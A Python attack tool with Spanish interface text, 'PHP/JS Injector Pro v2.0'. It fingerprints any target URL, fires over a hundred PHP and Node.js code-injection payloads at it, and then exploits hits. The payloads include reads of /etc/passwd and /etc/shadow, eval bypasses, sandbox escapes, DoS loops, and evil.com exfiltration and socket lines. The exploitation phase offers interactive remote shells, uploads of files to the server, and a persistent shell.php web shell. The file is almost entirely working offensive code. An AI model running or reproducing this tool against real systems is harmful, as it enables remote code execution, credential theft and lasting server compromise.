import requests
from datetime import datetime
import os
import re
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import time

# ===== COLORES =====
V = "\033[92m"
A = "\033[93m"
R = "\033[91m"
C = "\033[96m"
B = "\033[1m"
N = "\033[0m"

def banner():
    print(f"""{C}{B}
╔══════════════════════════════════════════════════╗
║        PHP/JS INJECTOR PRO v2.0                  ║
║        Detector + Explotador + Shell              ║
╚══════════════════════════════════════════════════╝{N}
""")

def info_objetivo(url):
    """Muestra información del objetivo"""
    print(f"{B}[*] Información del objetivo{N}\n")
    try:
        r = requests.get(url, timeout=5)
        server = r.headers.get("Server", "Desconocido")
        powered = r.headers.get("X-Powered-By", "Desconocido")
        content_type = r.headers.get("Content-Type", "Desconocido")
        print(f"  URL: {url}")
        print(f"  Servidor: {server}")
        print(f"  Powered-By: {powered}")
        print(f"  Content-Type: {content_type}")
        print(f"  Status: {r.status_code}")
        print(f"  Tamaño: {len(r.content)} bytes")
        
        # Detectar CMS/Tecnología
        if "wp-content" in r.text.lower() or "wp-json" in r.text.lower():
            print(f"  CMS: {V}WordPress detectado{N}")
        elif "drupal" in r.text.lower():
            print(f"  CMS: {V}Drupal detectado{N}")
        elif "joomla" in r.text.lower():
            print(f"  CMS: {V}Joomla detectado{N}")
        elif "laravel" in r.text.lower():
            print(f"  Framework: {V}Laravel{N}")
        elif "node" in r.text.lower() or "express" in r.text.lower():
            print(f"  Backend: {V}Node.js{N}")
        elif "php" in r.text.lower():
            print(f"  Backend: {V}PHP detectado{N}")
        
        # Buscar formularios
        forms = re.findall(r'<form.*?</form>', r.text, re.DOTALL)
        if forms:
            print(f"  Formularios: {V}{len(forms)} encontrados{N}")
            for i, form in enumerate(forms[:3], 1):
                action = re.findall(r'action=["\'](.*?)["\']', form)
                method = re.findall(r'method=["\'](.*?)["\']', form)
                inputs = re.findall(r'<input.*?name=["\'](.*?)["\']', form)
                print(f"    Form {i}: {method[0] if method else 'GET'} -> {action[0] if action else '?'}")
                if inputs:
                    print(f"    Campos: {', '.join(inputs[:5])}")
        
        print()
        return True
    except Exception as e:
        print(f"  {R}[!] No se pudo conectar: {e}{N}\n")
        return False

def cargar_payloads_php():
    """Carga payloads de inyección PHP (80+ payloads)"""
    return [
        # === EJECUCIÓN DE COMANDOS ===
        "<?php system('id'); ?>",
        "<?php system('whoami'); ?>",
        "<?php system('ls -la'); ?>",
        "<?php system('cat /etc/passwd'); ?>",
        "<?php system('uname -a'); ?>",
        "<?php system('cat /etc/hosts'); ?>",
        "<?php system('netstat -an'); ?>",
        "<?php system('ps aux'); ?>",
        "<?php system('ifconfig'); ?>",
        "<?php system($_GET['cmd']); ?>",
        "<?php exec('id', $output); print_r($output); ?>",
        "<?php passthru('id'); ?>",
        "<?php shell_exec('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "<?php `id`; ?>",
        "<?php echo `id`; ?>",
        "<?php popen('id', 'r'); ?>",
        "<?php proc_open('id', [], $pipes); ?>",
        
        # === PHP INFO ===
        "<?php phpinfo(); ?>",
        "<?php phpinfo(INFO_GENERAL); ?>",
        "<?php phpinfo(INFO_CONFIGURATION); ?>",
        "<?php phpinfo(INFO_MODULES); ?>",
        "<?php phpinfo(INFO_ENVIRONMENT); ?>",
        "<?php phpinfo(INFO_VARIABLES); ?>",
        
        # === LECTURA DE ARCHIVOS ===
        "<?php echo file_get_contents('/etc/passwd'); ?>",
        "<?php readfile('/etc/passwd'); ?>",
        "<?php include '/etc/passwd'; ?>",
        "<?php require '/etc/passwd'; ?>",
        "<?php show_source('/etc/passwd'); ?>",
        "<?php highlight_file('/etc/passwd'); ?>",
        "<?php echo file_get_contents('index.php'); ?>",
        "<?php echo file_get_contents('../wp-config.php'); ?>",
        "<?php echo file_get_contents('../../.env'); ?>",
        "<?php echo file_get_contents('/etc/shadow'); ?>",
        "<?php echo file_get_contents('/etc/hosts'); ?>",
        "<?php echo file_get_contents('/proc/self/environ'); ?>",
        "<?php print_r(scandir('/')); ?>",
        "<?php print_r(scandir('.')); ?>",
        "<?php print_r(scandir('..')); ?>",
        "<?php foreach(glob('*') as $f) echo $f . '\\n'; ?>",
        "<?php $files = scandir('/'); foreach($files as $f) echo $f . '\\n'; ?>",
        
        # === ESCRITURA DE ARCHIVOS (WEB SHELL) ===
        "<?php file_put_contents('shell.php', '<?php system($_GET[\"cmd\"]); ?>'); ?>",
        "<?php file_put_contents('pwned.php', '<?php phpinfo(); ?>'); ?>",
        "<?php file_put_contents('upload.php', '<?php move_uploaded_file($_FILES[\"f\"][\"tmp_name\"], $_FILES[\"f\"][\"name\"]); ?>'); ?>",
        "<?php fwrite(fopen('shell.php', 'w'), '<?php system($_GET[\"cmd\"]); ?>'); ?>",
        "<?php $f=fopen('shell.php','w');fwrite($f,'<?php system($_GET[\"cmd\"]);?>');fclose($f); ?>",
        
        # === EVALUACIÓN DE CÓDIGO ===
        "<?php eval($_GET['code']); ?>",
        "<?php eval(base64_decode($_GET['code'])); ?>",
        "<?php eval(gzinflate(base64_decode($_GET['code']))); ?>",
        "<?php eval(stripslashes($_GET['code'])); ?>",
        "<?php assert($_GET['code']); ?>",
        "<?php create_function('', $_GET['code']); ?>",
        
        # === BYPASS DE FILTROS ===
        "<?=system('id')?>",
        "<?=`id`?>",
        "<?=phpinfo()?>",
        "<?=file_get_contents('/etc/passwd')?>",
        "<script language='php'>system('id');</script>",
        "<?pHp system('id'); ?>",
        "<?PHP SYSTEM('ID'); ?>",
        "<?php\x0asystem('id'); ?>",
        "<?php%0asystem('id'); ?>",
        "<?php%0dsystem('id'); ?>",
        "<?php%09system('id'); ?>",
        "<?php%0b%0system('id'); ?>",
        "<?php%0c%0system('id'); ?>",
        
        # === WRAPPERS ===
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "expect://id",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        "data://text/plain,<?php system('id'); ?>",
    ]

def cargar_payloads_js():
    """Carga payloads de inyección JS/Node.js (60+ payloads)"""
    return [
        # === RCE ===
        "require('child_process').exec('id')",
        "require('child_process').execSync('id')",
        "require('child_process').execSync('whoami')",
        "require('child_process').execSync('ls -la')",
        "require('child_process').execSync('cat /etc/passwd')",
        "require('child_process').execSync('cat package.json')",
        "require('child_process').execSync('env')",
        "require('child_process').execSync('ps aux')",
        "require('child_process').execSync('ifconfig')",
        "global.process.mainModule.require('child_process').execSync('id')",
        "this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')",
        "process.mainModule.require('child_process').execSync('id')",
        
        # === SANDBOX ESCAPE ===
        "({}).constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')",
        "this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')",
        "[].constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')",
        "''.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('id')",
        
        # === FILE SYSTEM ===
        "require('fs').readdirSync('/')",
        "require('fs').readdirSync('.')",
        "require('fs').readFileSync('/etc/passwd')",
        "require('fs').readFileSync('package.json')",
        "require('fs').readFileSync('.env')",
        "require('fs').readFileSync('index.js')",
        "require('fs').writeFileSync('shell.js', 'require(\"child_process\").execSync(process.argv[2])')",
        
        # === INFO ===
        "process.env",
        "process.version",
        "process.argv",
        "process.cwd()",
        "process.pid",
        "process.platform",
        "process.arch",
        "process.uptime()",
        "process.memoryUsage()",
        "process.cpuUsage()",
        "os = require('os'); os.hostname()",
        "os = require('os'); os.userInfo()",
        "os = require('os'); os.networkInterfaces()",
        "os = require('os'); os.cpus()",
        "os = require('os'); os.totalmem()",
        
        # === NETWORK ===
        "require('http').get('http://evil.com/steal')",
        "require('https').request({hostname:'evil.com',path:'/steal'})",
        "require('net').connect(1337, 'evil.com')",
        "require('dns').resolve('evil.com', 'A')",
        
        # === TEMPLATE INJECTION ===
        "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        "#{global.process.mainModule.require('child_process').execSync('id')}",
        "{{constructor.constructor('return global.process')().mainModule.require('child_process').execSync('id')}}",
        
        # === EVAL ===
        "eval('require(\"child_process\").execSync(\"id\")')",
        "eval(Buffer.from('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJpZCIp', 'base64').toString())",
        "Function('return require(\"child_process\").execSync(\"id\")')()",
        "new Function('return require(\"child_process\").execSync(\"id\")')()",
        
        # === DOS ===
        "while(true){}",
        "process.kill(process.pid, 'SIGUSR1')",
        
        # === ERROR INFO ===
        "Error().stack",
        "new Error().stack",
        "console.trace()",
    ]

def probar_payloads(url, payloads, tipo, metodo, encontrados, f):
    """Prueba múltiples payloads contra un objetivo"""
    indicadores = {
        "php": ["uid=", "gid=", "groups=", "PHP Version", "root:", "daemon:", "www-data:"],
        "js": ["uid=", "gid=", "groups=", "v", "node", "child_process"],
    }
    
    indicador = indicadores.get(tipo, [])
    
    for payload in payloads:
        try:
            if metodo == "GET":
                if "?" in url:
                    test_url = f"{url}&inject={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{url}?inject={urllib.parse.quote(payload)}"
                r = requests.get(test_url, timeout=5)
            else:
                r = requests.post(url, data={"code": payload, "data": payload, "input": payload}, timeout=5)
            
            for ind in indicador:
                if ind in r.text:
                    print(f"  {V}[+] {tipo.upper()} VULNERABLE{N}")
                    print(f"     Payload: {payload[:80]}")
                    print(f"     Indicador: {ind}\n")
                    encontrados.append((tipo, payload, ind))
                    f.write(f"[{tipo}] Payload: {payload} | Indicador: {ind}\n")
                    return True
        except:
            pass
    return False

def inyectar_php(url, codigo, metodo, f):
    """Inyecta código PHP"""
    try:
        payload = f"<?php {codigo}; ?>"
        
        if metodo == "GET":
            test_url = f"{url}?cmd={urllib.parse.quote(payload)}"
            r = requests.get(test_url, timeout=10)
        else:
            r = requests.post(url, data={"code": payload}, timeout=10)
        
        print(f"\n{C}{'─'*50}{N}")
        print(f"{V}{B}Respuesta PHP ({r.status_code} - {len(r.content)} bytes):{N}")
        print(f"{C}{'─'*50}{N}")
        print(r.text[:2000])
        print(f"{C}{'─'*50}{N}\n")
        
        f.write(f"\n[PHP INJECT] {codigo}\n{r.text[:2000]}\n")
        return r.text
    except Exception as e:
        print(f"{R}[!] Error: {e}{N}")
        return ""

def inyectar_js(url, codigo, metodo, f):
    """Inyecta código JavaScript"""
    try:
        if metodo == "GET":
            test_url = f"{url}?input={urllib.parse.quote(codigo)}"
            r = requests.get(test_url, timeout=10)
        else:
            r = requests.post(url, json={"data": codigo, "code": codigo}, timeout=10)
        
        print(f"\n{C}{'─'*50}{N}")
        print(f"{V}{B}Respuesta JS ({r.status_code} - {len(r.content)} bytes):{N}")
        print(f"{C}{'─'*50}{N}")
        print(r.text[:2000])
        print(f"{C}{'─'*50}{N}\n")
        
        f.write(f"\n[JS INJECT] {codigo}\n{r.text[:2000]}\n")
        return r.text
    except Exception as e:
        print(f"{R}[!] Error: {e}{N}")
        return ""

def shell_interactiva(url, tipo, metodo, f):
    """Shell interactiva para ejecutar comandos"""
    print(f"\n{V}{B}╔{'═'*50}╗")
    print(f"║   {tipo.upper()} SHELL INTERACTIVA                  ║")
    print(f"║   'exit' para salir | 'clear' para limpiar       ║")
    print(f"║   'upload' para subir archivo                    ║")
    print(f"╚{'═'*50}╝{N}\n")
    
    while True:
        try:
            cmd = input(f"{V}{tipo}> {N}").strip()
            
            if cmd.lower() == "exit":
                break
            elif cmd.lower() == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue
            elif cmd.lower() == "upload":
                ruta = input(f"{A}Ruta del archivo local: {N}").strip()
                if os.path.exists(ruta):
                    with open(ruta, "r") as file:
                        contenido = file.read()
                    if tipo == "php":
                        codigo = f"file_put_contents('{os.path.basename(ruta)}', base64_decode('{base64.b64encode(contenido.encode()).decode()}'))"
                        inyectar_php(url, codigo, metodo, f)
                    else:
                        codigo = f"require('fs').writeFileSync('{os.path.basename(ruta)}', Buffer.from('{base64.b64encode(contenido.encode()).decode()}', 'base64'))"
                        inyectar_js(url, codigo, metodo, f)
                else:
                    print(f"{R}[!] Archivo no encontrado{N}")
                continue
            
            if cmd:
                if tipo == "php":
                    inyectar_php(url, f"system('{cmd}')", metodo, f)
                else:
                    inyectar_js(url, f"require('child_process').execSync('{cmd}')", metodo, f)
        except KeyboardInterrupt:
            break

def main():
    banner()
    
    url = input(f"{B}URL objetivo:{N} ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    # Info
    if not info_objetivo(url):
        return
    
    # Método
    print(f"{B}[*] Método de envío:{N} 1. GET | 2. POST")
    metodo_op = input(f"    Elige (1-2, Enter=1): ").strip() or "1"
    metodo = "GET" if metodo_op == "1" else "POST"
    
    # Velocidad
    print(f"\n{B}[*] Velocidad de escaneo:{N}")
    print(f"    1. Normal (todos los payloads)")
    print(f"    2. Rápido (payloads clave)")
    vel_op = input(f"    Elige (1-2, Enter=1): ").strip() or "1"
    
    php_payloads = cargar_payloads_php()
    js_payloads = cargar_payloads_js()
    
    if vel_op == "2":
        php_payloads = php_payloads[:15]
        js_payloads = js_payloads[:15]
    
    # Archivo de resultados
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    nombre_archivo = f"injection_{ts}.txt"
    encontrados = []
    
    with open(nombre_archivo, "w") as f:
        f.write(f"PHP/JS Injector Pro v2.0\n")
        f.write(f"Objetivo: {url}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*50}\n\n")
        
        # FASE 1: Detección
        print(f"\n{C}{'='*50}{N}")
        print(f"{C}{B}   FASE 1: DETECCIÓN AUTOMÁTICA{N}")
        print(f"{C}{'='*50}{N}\n")
        
        print(f"{B}[*] Probando inyección PHP ({len(php_payloads)} payloads)...{N}")
        vuln_php = probar_payloads(url, php_payloads, "php", metodo, encontrados, f)
        
        print(f"\n{B}[*] Probando inyección JS ({len(js_payloads)} payloads)...{N}")
        vuln_js = probar_payloads(url, js_payloads, "js", metodo, encontrados, f)
        
        # Resultados
        print(f"\n{C}{'='*50}{N}")
        print(f"{C}{B}   RESULTADOS DE DETECCIÓN{N}")
        print(f"{C}{'='*50}{N}")
        print(f"  PHP Injection: {V}VULNERABLE{N}" if vuln_php else f"  PHP Injection: {R}No vulnerable{N}")
        print(f"  JS Injection:  {V}VULNERABLE{N}" if vuln_js else f"  JS Injection:  {R}No vulnerable{N}")
        print(f"  Payloads probados: {len(php_payloads) + len(js_payloads)}")
        print(f"  Vulnerabilidades: {len(encontrados)}")
        
        if not vuln_php and not vuln_js:
            print(f"\n{R}[!] No se detectaron vulnerabilidades.{N}")
            print(f"[!] Prueba con más payloads o cambia el método de envío.\n")
            os.system("pause")
            return
        
        f.write(f"\n{'='*50}\n")
        f.write(f"PHP: {'VULNERABLE' if vuln_php else 'No vulnerable'}\n")
        f.write(f"JS: {'VULNERABLE' if vuln_js else 'No vulnerable'}\n")
        
        # FASE 2: Explotación
        print(f"\n{C}{'='*50}{N}")
        print(f"{C}{B}   FASE 2: EXPLOTACIÓN{N}")
        print(f"{C}{'='*50}{N}\n")
        
        while True:
            print(f"{B}Opciones de explotación:{N}")
            print(f"  1. Inyectar código PHP")
            print(f"  2. Inyectar código JS")
            print(f"  3. PHP Shell interactiva (comandos)")
            print(f"  4. JS Shell interactiva (comandos)")
            print(f"  5. Subir archivo al servidor")
            print(f"  6. Crear Web Shell persistente")
            print(f"  7. Salir")
            
            opcion = input(f"\n{B}Elige (1-7):{N} ").strip()
            
            if opcion == "1":
                if not vuln_php:
                    print(f"\n{R}[!] PHP no es vulnerable.{N}")
                    continue
                print(f"\n{A}Ejemplos:{N} system('id'), phpinfo(), file_get_contents('/etc/passwd'), scandir('/')")
                codigo = input(f"{V}Código PHP:{N} ").strip()
                if codigo:
                    inyectar_php(url, codigo, metodo, f)
            
            elif opcion == "2":
                if not vuln_js:
                    print(f"\n{R}[!] JS no es vulnerable.{N}")
                    continue
                print(f"\n{A}Ejemplos:{N} require('child_process').execSync('id'), process.env, require('fs').readdirSync('/')")
                codigo = input(f"{V}Código JS:{N} ").strip()
                if codigo:
                    inyectar_js(url, codigo, metodo, f)
            
            elif opcion == "3":
                if not vuln_php:
                    print(f"\n{R}[!] PHP no es vulnerable.{N}")
                    continue
                shell_interactiva(url, "php", metodo, f)
            
            elif opcion == "4":
                if not vuln_js:
                    print(f"\n{R}[!] JS no es vulnerable.{N}")
                    continue
                shell_interactiva(url, "js", metodo, f)
            
            elif opcion == "5":
                ruta = input(f"{A}Ruta del archivo local: {N}").strip()
                if os.path.exists(ruta):
                    with open(ruta, "r") as file:
                        contenido = file.read()
                    if vuln_php:
                        codigo = f"file_put_contents('{os.path.basename(ruta)}', base64_decode('{base64.b64encode(contenido.encode()).decode()}'))"
                        inyectar_php(url, codigo, metodo, f)
                    else:
                        codigo = f"require('fs').writeFileSync('{os.path.basename(ruta)}', Buffer.from('{base64.b64encode(contenido.encode()).decode()}', 'base64'))"
                        inyectar_js(url, codigo, metodo, f)
                else:
                    print(f"{R}[!] Archivo no encontrado{N}")
            
            elif opcion == "6":
                if vuln_php:
                    print(f"\n{V}[*] Creando Web Shell PHP...{N}")
                    shell_code = "<?php system($_GET['cmd']); ?>"
                    codigo = f"file_put_contents('shell.php', '{shell_code}')"
                    inyectar_php(url, codigo, metodo, f)
                    print(f"{V}[+] Web Shell creada: {url}/shell.php?cmd=id{N}")
                elif vuln_js:
                    print(f"\n{V}[*] Creando Web Shell JS...{N}")
                    shell_code = "require('child_process').execSync(require('url').parse(request.url,true).query.cmd)"
                    codigo = f"require('fs').writeFileSync('shell.js', `{shell_code}`)"
                    inyectar_js(url, codigo, metodo, f)
                    print(f"{V}[+] Web Shell creada: {url}/shell.js?cmd=id{N}")
            
            elif opcion == "7":
                break
            
            print()
    
    print(f"\n{C}{B}[+] Sesión finalizada{N}")
    print(f"[+] Resultados guardados en: {nombre_archivo}")
    os.system("pause")

if __name__ == "__main__":
    main()
